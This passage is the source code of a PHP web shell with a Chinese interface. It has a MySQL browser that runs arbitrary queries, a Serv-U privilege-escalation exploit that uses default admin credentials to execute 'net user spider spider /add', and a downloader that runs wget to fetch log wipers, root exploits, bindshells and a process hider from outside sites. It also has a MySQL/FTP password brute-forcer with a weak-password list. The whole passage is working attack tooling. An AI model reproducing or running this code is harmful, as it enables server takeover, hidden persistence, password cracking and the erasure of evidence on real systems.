  echo("主机:<input type='text' name='host' size='30' value='localhost'><br><br>\n");
  echo("端口:<input type='text' name='port' size='30' value='3306'><br>\n");
  echo("<input type='submit' value='进入'>");
  echo("</form>");
}
function sql(){
  session_start();
  if(!$_GET['sqlf']){;}
  if($_POST['un'] && $_POST['pw']){;
    $_SESSION['sql_user'] = $_POST['un'];
    $_SESSION['sql_password'] = $_POST['pw'];
  }
  if($_POST['host']){$_SESSION['sql_host'] = $_POST['host'];}
  else{$_SESSION['sql_host'] = 'localhost';}
  if($_POST['port']){$_SESSION['sql_port'] = $_POST['port'];}
  else{$_SESSION['sql_port'] = '3306';}

  if($_SESSION['sql_user'] && $_SESSION['sql_password']){
    if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_password']))){
      unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);
      echo("Invalid credentials<br>\n");
      die(sqllogin());
    }
    else{
      $_SESSION['isloggedin'] = "true";
      echo '<br>[<a href="?s=sqlexp">执行SQL语句</a> | <a href="?s=sqllogin">连接MYSQL</a>]<br><br>';
    }
  }
  else{
    die(sqllogin());
  }
  if ($_GET['db']){
    mysql_select_db($_GET['db'], $sqlcon);
    if($_GET['sqlquery']){
      $dat = mysql_query($_GET['sqlquery'], $sqlcon) or die(mysql_error());
      $num = mysql_num_rows($dat);
      for($i=0;$i<$num;$i++){
        echo(mysql_result($dat, $i) . "<br>\n");
      }
    }
    else if($_GET['table'] && !$_GET['sqlf']){
      echo("<table>");
      $query = "SHOW COLUMNS FROM " . $_GET['table'];
      $result = mysql_query($query, $sqlcon) or die(mysql_error());
      $i = 0;
      $fields = array();
      while($row = mysql_fetch_assoc($result)){
        array_push($fields, $row['Field']);
        echo("<th>" . $fields[$i]);
        $i++;
      }
      $result = mysql_query("SELECT * FROM " . $_GET['table'], $sqlcon) or die(mysql_error());
      $num_rows = mysql_num_rows($result) or die(mysql_error());
      $y=0;
      for($x=1;$x<=$num_rows+1;$x++){
        if(!$_GET['p']){
          $_GET['p'] = 1;
        }
        if($_GET['p']){
          if($y > (30*($_GET['p']-1)) && $y <= 30*($_GET['p'])){
            echo("<tr>");
            for($i=0;$i<count($fields);$i++){
              $query = "SELECT " . $fields[$i] . " FROM " . $_GET['table'] . " WHERE " . $fields[0] . " = '" . $x . "'";
              $dat = mysql_query($query, $sqlcon) or die(mysql_error());
              while($row = mysql_fetch_row($dat)){
                echo("<td>" . $row[0] . "</td>");
              }
            }
            echo("</tr>\n");
          }
        }
        $y++;
      }
      echo("</table>\n");
      for($z=1;$z<=ceil($num_rows / 30);$z++){
        echo("<a href='?s=sql&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $z . "'>" . $z . "</a> | ");
      }
    }
    else{
      $query = "SHOW TABLES FROM " . $_GET['db'];
      $dat = mysql_query($query, $sqlcon) or die(mysql_error());
      while ($row = mysql_fetch_row($dat)){
        echo("<tr><td><a href='?s=sql&db=" . $_GET['db'] . "&table=" . $row[0] ."'>" . $row[0] . "</a></td></tr>\n");
      }
    }
  }
  else{
    $dbs=mysql_list_dbs($sqlcon);
    while($row = mysql_fetch_object($dbs)) {
      echo("<tr><td><a href='?s=sql&db=" . $row->Database . "'>" . $row->Database . "</a><br></td></tr>\n");
    }
  }
  echo '<tr><td>';
}
//提权EXP
function serexp(){
	echo '<br>[<a href="?s=tools">下载后门</a> | <a href="?s=serexp">Serv-U提权</a> | <a href="?s=crack">暴力破解</a>]<br><br>';
	$job=$_GET['job'];
	if($_POST['SUPort'] != "" && $_POST['SUUser'] != "" && $_POST['SUPass'] != "")
  {
      echo "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\"><tr><td align=\"left\">";
      $sendbuf = "";
      $recvbuf = "";
      $domain  = "-SETDOMAIN\r\n".
              "-Domain=haxorcitos|0.0.0.0|21|-1|1|0\r\n".
              "-TZOEnable=0\r\n".
              " TZOKey=\r\n";
      $adduser = "-SETUSERSETUP\r\n".
              "-IP=0.0.0.0\r\n".
              "-PortNo=21\r\n".
              "-User=".$user."\r\n".
              "-Password=".$password."\r\n".
              "-HomeDir=c:\\\r\n".
              "-LoginMesFile=\r\n".
              "-Disable=0\r\n".
              "-RelPaths=1\r\n".
              "-NeedSecure=0\r\n".
              "-HideHidden=0\r\n".
              "-AlwaysAllowLogin=0\r\n".
              "-ChangePassword=0\r\n".
              "-QuotaEnable=0\r\n".
              "-MaxUsersLoginPerIP=-1\r\n".
              "-SpeedLimitUp=0\r\n".
              "-SpeedLimitDown=0\r\n".
              "-MaxNrUsers=-1\r\n".
              "-IdleTimeOut=600\r\n".
              "-SessionTimeOut=-1\r\n".
              "-Expire=0\r\n".
              "-RatioUp=1\r\n".
              "-RatioDown=1\r\n".
              "-RatiosCredit=0\r\n".
              "-QuotaCurrent=0\r\n".
              "-QuotaMaximum=0\r\n".
              "-Maintenance=None\r\n".
              "-PasswordType=Regular\r\n".
              "-Ratios=None\r\n".
              " Access=".$part."\|RWAMELCDP\r\n";
      $deldomain="-DELETEDOMAIN\r\n".
                   "-IP=0.0.0.0\r\n".
                   " PortNo=21\r\n";
      $sock = @fsockopen("127.0.0.1", $_POST["SUPort"], &$errno, &$errstr, 10);
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "USER ".$_POST["SUUser"]."\r\n";
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "SITE MAINTENANCE\r\n";
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = $domain;
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = $adduser;
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      echo "**********************************************************<br>";
	if($job!=="adduser"){
      echo "Starting Exploit ...<br>";
      echo "**********************************************************<br>";
      $exp = @fsockopen("127.0.0.1", "21", &$errno, &$errstr, 10);
      $recvbuf = @fgets($exp, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "USER ".$user."\r\n";
      @fputs($exp, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($exp, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "PASS ".$password."\r\n";
      @fputs($exp, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($exp, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      $sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
      @fputs($exp, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: site exec</font> <font color=green>".$_POST["SUCommand"]."</font><br>";
      $recvbuf = @fgets($exp, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
      echo "**********************************************************<br>";
      echo "Starting Delete Domain ...<br>";
      echo "**********************************************************<br>";
      $sendbuf = $deldomain;
      @fputs($sock, $sendbuf, strlen($sendbuf));
      echo "<font color=blue>Send: $sendbuf</font><br>";
      $recvbuf = @fgets($sock, 1024);
      echo "<font color=red>Recv: $recvbuf</font><br>";
    }else{
		echo "All done ...<br>";
		echo "**********************************************************<br>";
		}
      echo "</td></tr></table>";
      @fclose($sock);
      if($job!=="adduser") @fclose($exp);
  	}
  echo '<b>Serv-U提权</b><br><form action="?s=serexp" method="POST">
  LocalPort:<input name="SUPort" type="text" id="SUPort" value="43958"><br>
  LocalUser:<input name="SUUser" type="text" id="SUUser" value="LocalAdministrator"><br>
  LocalPass:<input name="SUPass" type="text" id="SUPass" value="#l@$ak#.lk;0@P"><br>';
	if($job!=="adduser"){
		echo '提权命令: 
    <input name="SUCommand" type="text" id="SUCommand" value="net user spider spider /add" size="50"><br><a href="?s=serexp&job=adduser">[转换为添加用户]</a>
	  <input name="user" type="hidden" value="spider">
	  <input name="password" type="hidden" value="spider">
	  <input name="part" type="hidden" value="C:\"> ';
	 }
	  else{
		echo '帐号:<input name="user" type="text" value="spider" size="20">
	  密码:<input name="password" type="text" value="spider" size="20">
	  目录:<input name="part" type="text" value="C:\" size="20"><br>
	  <a href="?s=serexp">[转换为执行CMD]</a><input name="job" type="hidden" value="<?=$job?>">';
	  }
	echo'</td></tr><tr>
  <td align="center"><br><input name="Submit" type="submit" id="Submit" value="执行">　
  <input name="Submit" type="reset" value="重置"><br><br>';
}
function grab($file){
  $updir = $_POST['loc'];
  $filex = array_pop(explode("/", $file));
  if(exec("wget $file -b -O $updir/$filex")){echo "<br>下载成功.<br><br>";}
  else{echo "<br>下载失败.<br><br>";}
}
function tools($curdir){
	echo '<br>[<a href="?s=tools">下载后门</a> | <a href="?s=serexp">Serv-U提权</a> | <a href="?s=crack">暴力破解</a>]<br><br>';
  $tools = array(
  "--- Log wipers ---"=>"1",
  "Vanish2.tgz"=>"http://packetstormsecurity.org/UNIX/penetration/log-wipers/vanish2.tgz",
  "Cloak.c"=>"http://packetstormsecurity.org/UNIX/penetration/log-wipers/cloak.c",
  "gh0st.sh"=>"http://packetstormsecurity.org/UNIX/penetration/log-wipers/gh0st.sh",
  "--- Priv Escalation ---"=>"2",
  "h00lyshit - Linux 2.6 ALL"=>"http://someshit.net/files/xpl/h00lyshit",
  "k-rad3 - Linux <= 2.6.11"=>"http://someshit.net/files/xpl/krad3",
  "raptor - Linux <= 2.6.17.4"=>"http://someshit.net/files/xpl/raptor",
  "rootbsd - BSD v?"=>"http://someshit.net/files/xpl/rootbsd",
  "--- Bindshells ---"=>"3",
  "THC rwwwshell-1.6.perl"=>"http://packetstormsecurity.org/groups/thc/rwwwshell-1.6.perl",
  "Basic Perl bindshell"=>"http://packetstormsecurity.org/groups/synnergy/bindshell-unix",
  "--- Misc ---"=>"4",
  "MOCKS SOCKS4 Proxy"=>"http://superb-east.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz",
  "xps.c (proc hider)"=>"http://packetstormsecurity.org/groups/shadowpenguin/unix-tools/xps.c");
  $names = array_flip($tools);
  echo("<form method='post'>");
  echo("<b>选择后门程序: </b><select name='gf'>");
  foreach($tools as $tool) {echo("<option value='" . $tool . "'>" . $names[$tool] . "</option>\n");}
  echo("</select><br><br>");
  echo("<b>下载到目录: </b>");
  echo("<input type='text' name='loc' size='45' value='" . $curdir . "'>");
  echo("<br><input type='submit' value='下载'>");
  echo("</form>");
  $gf = $_POST['gf'];
	if($gf){grab($gf);}
}
function crack(){
echo '<br>[<a href="?s=tools">下载后门</a> | <a href="?s=serexp">Serv-U提权</a> | <a href="?s=crack">暴力破解</a>]<br><br>';
echo '<form method="POST">';
echo '<b>暴力破解mysql或ftp密码</b><br><br>';
echo '<input type="radio" name="ctype" value="mysql" checked>MYSQL <input type="radio" name="ctype" value="ftp">FTP';
echo '<br><br>host: <input name="host" value="localhost" type="text" size="12"> ';
echo '帐号:<input name="root" value="root" type="text" size="12"> ';
echo '<br><br><input type="radio" name="non" value="2" checked>使用默认的弱口令 <input type="radio" name="non" value="1">使用指定字典';
echo '<input name="fpass" value="./password.txt" type="text" size="20">';
echo '<br><br><input name="submit" value="开始破解" type="submit">';
echo '</form><br>';
if($_POST['submit']){
	$host=$_POST['host'];
	$root=$_POST['root'];
	$fpass=$_POST['fpass'];
	$ctype=$_POST['ctype'];
	$non=$_POST['non'];
	if($non=='1')
	$file=file($fpass);
	elseif($non=='2')
	$file=array('root','bio','sa','sa123','123456','!@#$','!@#$%','!@#$%^','!@#$%^&','!@#$%^&*','000000','654321','admin','0123456789','777','777777','777777777','888','888888','888888888','520520','5201314','admin888','superadmin','administrator','administrators');
	for($i=0;$i<count($file);$i++){
		if($ctype=="mysql"){
			$acc=@mysql_connect($host,$root,chop($file[$i]));
		}
		elseif($ctype=="ftp"){
			$acc=@ftp_login(ftp_connect($host,'21'),$user,chop($file[$i]));
		}
		if($acc)
		echo '密码为: '.$file[$i];
	}
		if(!$acc)
		echo '没找到匹配的密码';
}
}
?>
</div></center></body></html>